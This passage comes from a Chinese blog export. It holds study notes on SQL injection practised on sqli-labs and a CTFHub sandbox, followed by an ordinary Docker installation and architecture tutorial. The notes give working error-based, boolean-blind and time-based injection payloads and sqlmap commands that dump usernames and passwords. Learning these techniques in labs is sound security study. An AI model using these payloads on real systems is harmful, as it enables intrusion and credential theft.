src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201160031944.png" alt="image-20240201160031944"></p><p>id&#x3D;100’ and 1&#x3D;extractvalue(1,concat(0x7e,(select database())))–+，这种写法也可以，因为是报错回显，所以不用在意回显位置</p><p>要查表名的，则把databas()这个函数换掉即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201162001229.png" alt="image-20240201162001229"></p><p>再获取users里的列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))) --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201162234530.png" alt="image-20240201162234530"></p><p>再获取列里需要的具体数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select group_concat(username,&#x27;~&#x27;,password) from users))) --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201162428529.png" alt="image-20240201162428529"></p><p>但数据不全，因为默认只能返回32个字节，所以可以在外面套个substring函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select substring(group_concat(username,&#x27;~&#x27;,password),25,30) from users))) --+</span><br></pre></td></tr></table></figure><p>表示从25往后再显示30个字符</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201162621595.png" alt="image-20240201162621595"></p><h4 id="uptatexml函数"><a href="#uptatexml函数" class="headerlink" title="uptatexml函数"></a>uptatexml函数</h4><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201162929770.png" alt="image-20240201162929770"></p><p>这个函数是三个参数的，原理和前面一样，也是把路径那个参数更改，第三个参数随便输个‘1’就行，下面拿Less-4来，这个是双引号+括号闭合的，先查查库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;...?id=1&quot;) and 1=extractvalue(1,concat(0x7e,(select database()))) --+</span><br></pre></td></tr></table></figure><p>查完库名再查表名,注意一下括号匹配</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201170838879.png" alt="image-20240201170838879"></p><p>查完表名查列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database())),3) --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201171212580.png" alt="image-20240201171212580"></p><p>再查内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select group_concat(username,&#x27;~&#x27;,password) from users)),3) --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201171319765.png" alt="image-20240201171319765"></p><p>一样是32个字节，需要用substring来慢慢看</p><h4 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a>floor报错</h4><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201172417362.png" alt="image-20240201172417362"></p><p>rand()默认是0-1</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201172638092.png" alt="image-20240201172638092"></p><p>rand()*2则是生成0-2的随机数，如果在后面加上表，则表中有多少行rand就执行多少次</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201173129418.png" alt="image-20240201173129418"></p><p>floor()向下取整，如果是rand()*2则是1或0</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201172711522.png" alt="image-20240201172711522"></p><p>ceiling()向上取整，和floor类似</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201172754797.png" alt="image-20240201172754797"></p><p>concat_ws()将第2，3两个参数用第一个参数连接起来，可以通过修改参数获得需要的信息</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201172851655.png" alt="image-20240201172851655"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--库名</span><br><span class="line">select concat_ws(&#x27;~&#x27;,1,(select database()));</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201173544763.png" alt="image-20240201173544763"></p><p>还可以把1换成floor(rand()*2),方便后续统计数量</p><p>group by</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select concat_ws(&#x27;~&#x27;,floor(rand()*2),(select database())) as ben from users group by ben;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201181152735.png" alt="image-20240201181152735"></p><p>count()统计数量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*),concat_ws(&#x27;~&#x27;,floor(rand()*2),(select database())) as ben from users group by ben;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201183140877.png" alt="image-20240201183140877"></p><p>数字会变化，但和不会，这个要全0全1</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201183215704.png" alt="image-20240201183215704"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201183240343.png" alt="image-20240201183240343"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201194213286.png" alt="image-20240201194213286"></p><p>在里面的数字，应该是随机数种子，确定后就不会变了，0是会报错的，有些又不会，就用0把</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201195528155.png" alt="image-20240201195528155"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201200009652.png" alt="image-20240201200009652"></p><p>往group_key写入数据时要重新进行计算，所以可能会导致重复</p><p>接下来试一试，基本就是把concat_ws的参数换成之前的代码，下面来看看表名，同样注意括号匹配,<strong>只要改concat_ws的参数即可，其它不用动</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,count(*),concat_ws(&#x27;-&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2)) as a from information_schema.tables group by a;--+</span><br></pre></td></tr></table></figure><p>还是挺长的<img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201201242950.png" alt="image-20240201201242950"></p><p>最终也是获得了表名，下面来获取列名，同样的操作，替换语句即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,count(*),concat_ws(&#x27;-&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),floor(rand(0)*2)) as a from information_schema.columns group by a; --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201201455769.png" alt="image-20240201201455769"></p><p>下面查找字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,count(*),concat_ws(&#x27;-&#x27;,(select group_concat(username,&#x27;-&#x27;,password) from users),floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201202207721.png" alt="image-20240201202207721"></p><p>没显示。。。，去掉group试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,count(*),concat_ws(&#x27;-&#x27;,(select concat(username,&#x27;-&#x27;,password) from users),floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201202329552.png" alt="image-20240201202329552"></p><p>加个限制一下,注意limit0,1指从0开始显示第1行，然后得加在修改得地方，其他地方不动，也可以用where id&#x3D;1，但有时候不一定又id这列，所以还是用第一种把</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,count(*),concat_ws(&#x27;-&#x27;,(select concat(username,&#x27;-&#x27;,password) from users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201202511088.png" alt="image-20240201202511088"></p><p>但这个一行最多也是64个字节，如果太多可以加上substring，当然也是夹在修改得地方</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,count(*),concat_ws(&#x27;-&#x27;,substring((select concat(username,&#x27;-&#x27;,password) from users limit 0,1),2,4),floor(rand(0)*2)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201202819263.png" alt="image-20240201202819263"></p><p>从第二个字符开始，显示4个字符</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201203121868.png" alt="image-20240201203121868"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201203311487.png" alt="image-20240201203311487"></p><p><strong>关键函数：ascii()</strong></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201203546134.png" alt="image-20240201203546134"></p><p>注意数字可以不带引号，字符需要加引号，字符串只显示第一个字符，所以我们需要用到substr函数，substr((),1,1)从第一个字符开始显示一个字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(substr((select database()),1,1))&gt;=130--+</span><br></pre></td></tr></table></figure><p>就是根据数据库名各个字符的ascii值，通过用范围逼近确定是哪个字母，一位一位确定，是不是呢，则通过页面返回的状态来确定，传真和传假的页面是不同的，可以先确定一下。感觉好麻烦，还是用sqlmao把</p><p>然后要查表名的话就是替换select database()即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201230553330.png" alt="image-20240201230553330"></p><p>这里就不要group了，一张表一张表确定比较合理。所以加上limit 0，1。下限确定，再确定上限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;106 --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201230856011.png" alt="image-20240201230856011"></p><p>因为知道是e，所以直接试试&#x3D;把。。。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201231128541.png" alt="image-20240201231128541"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201231213126.png" alt="image-20240201231213126"></p><p>补充sqlmap</p><p>查库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-697209b99487bc8f.sandbox.ctfhub.com:10800?id=1&quot; --dbs  --batch</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240301225101809.png" alt="image-20240301225101809"></p><p>查表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-697209b99487bc8f.sandbox.ctfhub.com:10800?id=1&quot; -D sqli --tables  --batch</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240301225207030.png" alt="image-20240301225207030"></p><p>查列</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-697209b99487bc8f.sandbox.ctfhub.com:10800?id=1&quot; -D sqli -T flag --columns  --batch</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240301232736773.png" alt="image-20240301232736773"></p><p>查字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-697209b99487bc8f.sandbox.ctfhub.com:10800?id=1&quot; -D sqli -T flag -C flag --dump  --batch</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240301232805702.png" alt="image-20240301232805702"></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p><strong>关键函数：sleep 、if(condition,true,false)</strong></p><p>sleep挺多少秒，后面的if结合上一起看,就是前面的条件为真执行第二个函数，为假则执行最后一个，可以把sleep放在里面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select if(2&gt;1,sleep(3),sleep(2));</span><br></pre></td></tr></table></figure><p>使用方式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select if(ascii(substr((select database())&gt;100,1,1),sleep(0),sleep(3)) --+</span><br></pre></td></tr></table></figure><p>注入时建议先写参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f(ascii(substr((select database()),1,1))&gt;100,sleep(0),sleep(3)) --+</span><br></pre></td></tr></table></figure><p>慢慢查库名，这里直接用&#x3D;了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((select database()),1,1))=115,sleep(0),sleep(3))</span><br></pre></td></tr></table></figure><p>可以看到页面很快就刷新了。表名和列名则替换substr的第一个参数即可，和之前一样,记得加上 limit 0,1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(0),sleep(3))--+</span><br></pre></td></tr></table></figure><p>查列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))=105,sleep(0),sleep(3))--+</span><br></pre></td></tr></table></figure><p>查字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((select username from users limit 0,1),1,1))=105,sleep(0),sleep(3))--+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240202171741470.png" alt="image-20240202171741470"></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240202173217774.png" alt="image-20240202173217774"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variable like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240202173059912.png" alt="image-20240202173059912"></p><p>null时不行，空着是都可以</p><p>这里拿Less-7来练习</p>]]></content>
      
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker</title>
      <link href="/2024/03/02/docker/"/>
      <url>/2024/03/02/docker/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>Hypervisor允许多个操作系统共享一个CPU(多核CPU的情况可以是多个CPU)。处于操作系统与硬件系统之间，用于实现多个虚拟机共享宿主机的硬件系统。</p><p>hyper-v则是微软提供的商业化Hypervisor，运行在windows系统上</p><p>KVM与Xen是linux系统上开源的Hypervisor</p><p>现在的Windows系统的架构（操作系统和应用层分别是两个虚拟机，位于Hyper-V之上）</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240229202902295.png" alt="image-20240229202902295"></p><p>容器与虚拟机的最大区别是</p><p>虚拟机中存在独立的硬件系统与操作系统，但容器中的全部是共享的宿主机中的操作系统与硬件系统。</p><p>VMware Workstation 要等到15.5.5版本开始，才对VMM虚拟机技术进行了重构，之前需要直接调用CPU的虚拟化功能，现在调用Win10系统的WHP（Windows 的Hypervisor平台）的API，解决了VMware Workstation与Hyper-V的不兼容问题。</p><h2 id="Docker的架构图"><a href="#Docker的架构图" class="headerlink" title="Docker的架构图"></a>Docker的架构图</h2><p><img src="https://docs.docker.com/get-started/images/docker-architecture.webp" alt="Docker Architecture diagram"></p><p>Docker使用客户机-服务器架构。Docker客户端与Docker守护进程通信，后者完成构建、运行和分发Docker容器的繁重工作。Docker客户端和守护进程可以运行在同一个系统上，或者您可以将Docker客户端连接到远程Docker守护进程。Docker客户端和守护进程使用REST API，通过UNIX套接字或网络接口进行通信。另一个Docker客户端是Docker Compose，它允许你处理由一组容器组成的应用程序。</p><h2 id="Centos安装Doker"><a href="#Centos安装Doker" class="headerlink" title="Centos安装Doker"></a>Centos安装Doker</h2><p><a href="https://blog.csdn.net/weixin_41394654/article/details/123442460">CentOS7安装jdk</a></p><p>查看防火墙状态</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl status firewalld</span><br></pre></td></tr></table></figure><p>开启的话要关闭，然后可以做一个有基本命令和功能的基础虚拟机，然后用VM克隆。</p><p>centos的网卡文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/sysconfig/network-script/ifcfg-ens33</span><br></pre></td></tr></table></figure><p>配置完可以加到hosts文件，之后用MobaXterm连接可以直接用名字，解析更方便，不加也没关系</p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240229221236567.png" alt="image-20240229221236567" style="zoom:67%;" /><p>下面安装仓库repository</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo yum install -y yum-utils</span><br><span class="line">$ sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><p>用阿里云的镜像地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum-config-manager --add-repo     http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"> </span><br><span class="line">​</span><br></pre></td></tr></table></figure><p>看下yun的仓库文件下有没有Docker</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ll /etc/yum.repos.d</span><br></pre></td></tr></table></figure><p>安装Docker Engine</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum - y install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</span><br></pre></td></tr></table></figure><p>加个-y用来同意，省的输入,下面这个可以用来看版本，挑想要的装</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum list docker-ce --showduplicates | sort -r</span><br></pre></td></tr></table></figure><p>安装的时候把version string换成想要的即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install docker-ce- &lt;VERSION STRING&gt; docker-ce-cli- &lt;VERSION_ STRING》 containerd.io docker-compose-plugin</span><br><span class="line">​</span><br></pre></td></tr></table></figure><p>安装后</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure><p>这一步记得在root权限执行，不然容易出问题</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240229232953166.png" alt="image-20240229232953166"></p><p>然后,看一下自己有什么镜像</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>然后可以试一下hello world</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240229233235488.png" alt="image-20240229233235488"></p><p>因为没有这个镜像，一般会去下载默认的最新的这个镜像，没加tags默认就是leatest，然后latest：后面的那个就是拉取来源，hello到之后的内容就是镜像的结果，然后可以再看一下你的库里有什么</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240229233440257.png" alt="image-20240229233440257"></p><p>可以发现多了个hello-world的镜像，然后上面有相应的信息</p><p>再来查看一下状态</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl status docker</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240301143347091.png" alt="image-20240301143347091"></p><p>这个disable说明这个不是自启动的，我们可以通过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure><p>来让他自启动</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240301143544195.png" alt="image-20240301143544195"></p><p>练习的时候就不用自启动了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl disable docekr</span><br></pre></td></tr></table></figure><p>docker的关闭,关闭虚拟机时可以先关闭docker</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop docker</span><br></pre></td></tr></table></figure><h2 id="配置国内加速器官方教程"><a href="#配置国内加速器官方教程" class="headerlink" title="配置国内加速器官方教程"></a>配置国内加速器<a href="https://developer.aliyun.com/article/886423?accounttraceid=73363bc7579a4e34963fee55e20ac1b2rtpf">官方教程</a></h2><p>先登陆阿里云加速器的网站，然后进入镜像加速器的页面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://cr.console.aliyun.com/cn-hangzhou/mirrors</span><br></pre></td></tr></table></figure><p>在etc文件下创建一个docker目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br></pre></td></tr></table></figure><p>然后用tee命令把东西输入到daemon.json文件，这个文件是新建的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tee /etc/docker/dameon.json &lt;&lt;-&#x27;EOF&#x27;</span><br></pre></td></tr></table></figure><p>tee命令可以创建一个文件，然后你输入一个东西他会写进去并回显你输入的东西</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# tee hello.log</span><br><span class="line">hello</span><br><span class="line">hello</span><br><span class="line">hello 1</span><br><span class="line">hello 1</span><br><span class="line">hello 2</span><br><span class="line">hello 2</span><br><span class="line">^C</span><br><span class="line">[root@localhost ~]# cat hello.log</span><br><span class="line">hello</span><br><span class="line">hello 1</span><br><span class="line">hello 2</span><br></pre></td></tr></table></figure><p>具体内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# tee /etc/docker/dameon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt; &quot;registry-mirrors&quot;: [&quot;https://9e15pjnb.mirror.aliyuncs.com&quot;]</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; EOF</span><br><span class="line">&#123;</span><br><span class="line">&quot;registry-mirrors&quot;: [&quot;https://9e15pjnb.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">[root@localhost ~]# cat /etc/docker/dameon.json</span><br><span class="line">&#123;</span><br><span class="line">&quot;registry-mirrors&quot;: [&quot;https://9e15pjnb.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">[                  root@localhost ~]#</span><br></pre></td></tr></table></figure><p>然后重新加载一下配置和重启一下docker</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>拉一个centos：7的镜像试试,感觉还是挺慢的</p><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker pull centos:7</span><br><span class="line">7: Pulling from library/centos</span><br><span class="line">2d473b07cdd5: Pull complete</span><br><span class="line">Digest: sha256:be65f488b7764ad3638f236b7b515b3678369a5124c47b8d32916d6487418ea4</span><br><span class="line">Status: Downloaded newer image for centos:7</span><br><span class="line">docker.io/library/centos:7</span><br></pre></td></tr></table></figure><h2 id="Docker引擎的卸载"><a href="#Docker引擎的卸载" class="headerlink" title="Docker引擎的卸载"></a>Docker引擎的卸载</h2><ol><li><p>Uninstall the Docker Engine, CLI, containerd, and Docker Compose packages:</p><figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo yum remove docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin docker-ce-rootless-extras</span></span><br></pre></td></tr></table></figure></li><li><p>Images, containers, volumes, or custom configuration files on your host aren’t automatically removed. To delete all images, containers, and volumes:</p><figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">rm</span> -rf /var/lib/docker</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">rm</span> -rf /var/lib/containerd</span></span><br></pre></td></tr></table></figure></li></ol><p>3.还有一些自己创建的配置文件</p><h2 id="Docker发展"><a href="#Docker发展" class="headerlink" title="Docker发展"></a>Docker发展</h2><p>首发架构由两大核心组件构成: LXC(Linux Container) 与Docker Daemon。<br>首发架构的两大问题:</p><p>严重依赖于LXC，出现了“卡脖子”问题，及无法实现Docker跨平台。所以在0.9版本使用了Docker自研的Libcontainer替换了LxC。</p><p>Docker Daemon中的“大而全”使得版本更新难、性能出现瓶颈、不符合软件哲学(由Unix团队提出)，关键是，其还存在着“中心化”问题。所以在1.1版本中其实现了OCI规范，将容器运行时Runc从Docker Daemon中剥离出来。</p><h3 id="Docker引擎架构"><a href="#Docker引擎架构" class="headerlink" title="Docker引擎架构"></a>Docker引擎架构</h3><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240301161001288.png" alt="image-20240301161001288"></p><ul><li>Docker Client：用户提交Docker命令。</li><li>Docked：负责REST API、处理镜像相关命令、网络、容器编排等。</li><li>Containerd：负责容器生命周期的管理，负责处理容器相关的命令，但不负责创建容器，当docker un命令的到来时会fork出Runc和Shim两个进程</li><li>Runc：负责创建容器进程，容器创建并启动后，将容器进程交给Shim处理，然后自己推出。</li><li>Shim：负责将容器与Docker Daemon进行解耦</li></ul><h3 id="Docker引擎分类"><a href="#Docker引擎分类" class="headerlink" title="Docker引擎分类"></a>Docker引擎分类</h3><p> Docker三大版本（Moby、CE、EE），两个小版本(edge月、stable季)</p><h2 id="镜像基础"><a href="#镜像基础" class="headerlink" title="镜像基础"></a>镜像基础</h2><h3 id="镜像简介"><a href="#镜像简介" class="headerlink" title="镜像简介"></a>镜像简介</h3><p>镜像是一种轻量级、可执行的独立软件包，也可以说是一个精简的操作系统。镜像中包含应用软件及应用软件的运行环境。具体来说镜像包含运行某个软件所需的所有内容，包括代码、库、环境变量和配置文件等。几乎所有应用，直接打包为 Docker 镜像后就可以运行。由于镜像的运行时是容器，容器的设计初衷就是快速和小巧，所以镜像通常都比较小，镜像中不包含内核，其共享宿主机的内核:镜像中只包含简单的 Shell，或没有 Shell。</p><p>busybox一个大的工具箱，集成了很多有用的linux命令工具等，堪称linux的瑞士军刀，下载一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull busybox</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/busybox</span><br><span class="line">9ad63333ebc9: Pull complete</span><br><span class="line">Digest: sha256:6d9ac9237a84afe1516540f40a0fafdc86859b2141954b4d643af7066d598b74</span><br><span class="line">Status: Downloaded newer image for busybox:latest</span><br><span class="line">docker.io/library/busybox:latest</span><br></pre></td></tr></table></figure><p>很小，就是一个微型的系统</p><h3 id="仓库分类"><a href="#仓库分类" class="headerlink" title="仓库分类"></a>仓库分类</h3><ul><li><p>Docker Official Image</p><p>Docker 官方镜像仓库。该类仓库中的镜像由 Docker 官方构建发布，代码质量较高且安全，有较完善的文档。该类仓库中的镜像会及时更新。一般常用的系统、工具软件、中间件都有相应的官方镜像仓库。例如，Zookeeper、Redis、Nginx 等。官方镜像仓库的名称<repository>一般直接为该类软件的名称<software-name>。“</p></li><li><p>Verified Publisher</p><p>已验证发布者仓库。该类仓库中的镜像由非 Docker 官方的第三方发布。但该第三方是由 Docker 公司审核认证过的，一般为大型企业、团体或组织。审核通过后，Docker 公司会向其颁发“VERIFIED PUBLISHER”标识。这种仓库中镜像的质量还有有保证的。除了官方镜像仓库，其它都是非官方镜像仓库。非官方镜像仓库名称<repository>一般由发布者用户名与软件名称两部分构成，形式为: <username>&#x2F;<software-name></p></li><li><p>Sponsored OSS</p><p>由 Docker 公司赞助开发的镜像仓库。该类仓库中的镜像也由非 Docker 官方的第三方发布，但该镜像的开发是由 Docker 公司赞助的。该类型的第三方一般为个人、团队或组织。这种仓库中镜像的质量也是有保证的。“</p></li><li><p>无认证</p></li></ul><p>​不安全</p><ul><li><p>第三方镜像中心</p><p>镜像中心默认使用的都是 Docker 官方的 Docker Hub。不过，镜像中心是可配置的，可以使用指定的第三方镜像中心。对于第三方镜像中心中的仓库名称<repository>由三部分构成:<domain-name>&#x2F;<username>&#x2F;<software-name>。其中的<domain-name>指的是第三方镜像中心的域名或IP。</p></li></ul><h3 id="镜像定位"><a href="#镜像定位" class="headerlink" 